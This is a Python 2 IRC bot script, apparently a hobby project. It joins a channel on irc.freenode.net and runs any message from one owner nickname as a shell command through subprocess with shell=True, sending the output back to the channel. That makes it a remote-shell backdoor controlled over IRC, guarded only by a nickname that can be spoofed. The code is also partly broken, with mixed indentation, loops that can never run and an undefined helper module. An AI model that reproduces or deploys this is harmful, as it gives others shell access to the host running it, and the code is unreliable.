#!/usr/bin/env python
import sys
from time import sleep
import socket
import string
import parser
import os
import subprocess as sp
HOST="irc.freenode.net"
PORT=6667
NICK="Interbot"
IDENT="Interbot"
REALNAME="Interbot"
OWNER="Pranav_rcmas"
CHANNELINIT="#noobcl"
readbuffer=""
s=socket.socket( )
s.connect((HOST, PORT))
s.send("NICK %s\r\n" % NICK)
s.send("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME))
s.send("JOIN :%s\r\n" % CHANNELINIT)


s.send("PRIVMSG %s :%s\r\n" % (CHANNELINIT, "Hi! I'm Interbot, and I'm your bitch xD"))

while True:
   data = s.recv ( 500 )
   print data
   if data.find ( 'PING' ) != -1:
      s.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
  
   if data.find("PRIVMSG") != -1:
         parser.parsemsg(data)
         data=data.rstrip() #remove trailing 'rn'
         #if data.find(OWNER)!=-1:
	
	 data=data.split()
	 data[3:] = [' '.join(data[3:])]
	 print data
	  
	 _controller_=data[0].split('!')
	 _controller_[0]=_controller_[0].strip(':')
	 print _controller_[0]
	 
	    
	 if _controller_[0]==OWNER:
		if data[3].find(":") != -1:
		    data[3]=data[3].strip(':') 
	      
		_terminal_=data[3];
		#os.system(_terminal_)
		p = sp.Popen(_terminal_, shell=True, stdout=sp.PIPE, )
		#result = p.read()
		#result[:]=[' '.join(result[:])]
		result=p.communicate()[0]
		result=result.replace('\n',' ')
		s.send("PRIVMSG %s :%s\r\n" % (CHANNELINIT, result))

while 1:
	readbuffer=readbuffer+s.recv(1024)
 	temp=string.split(readbuffer, "\n")
 	readbuffer=temp.pop( )

for line in temp:
	line=string.rstrip(line)
	line=string.split(line)

if(line[0]=="PING"):
	s.send("PONG %s\r\n" % line[1])
